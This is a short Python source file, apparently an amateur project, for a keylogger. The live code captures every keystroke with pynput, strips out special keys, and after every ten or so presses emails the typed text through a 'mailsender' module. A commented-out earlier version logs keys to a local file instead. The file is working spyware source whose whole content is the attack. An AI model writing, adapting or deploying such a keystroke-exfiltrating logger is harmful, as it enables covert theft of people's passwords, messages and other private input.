#pyinput
#logging

#File handling --> Write 
#Pressed time of Key, which key is pressed

#this is not a clean code


#----
#For local key logger
# from pynput.keyboard import Key, Listener
# import logging

# direc = ""

# logging.basicConfig(filename=(log_dir + "raghu.txt"), \
# 	level=logging.DEBUG, format='%(asctime)s: %(message)s')

# def vignesh(key):
#     logging.info(str(key))

# with Listener(on_press=vignesh) as raghu:
#     raghu.join()
#----

import pynput
from pynput.keyboard import Key, Listener
import mailsender

count = 0
keys = []

def tushar(key):
    print(key, end= " ")
    print("Tushar pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    mailsender.sendmail(message)
        

def vignesh(key):
    if key == Key.esc:
        return False

with Listener(on_press = tushar, on_release = vignesh) as raghu:
    raghu.join()

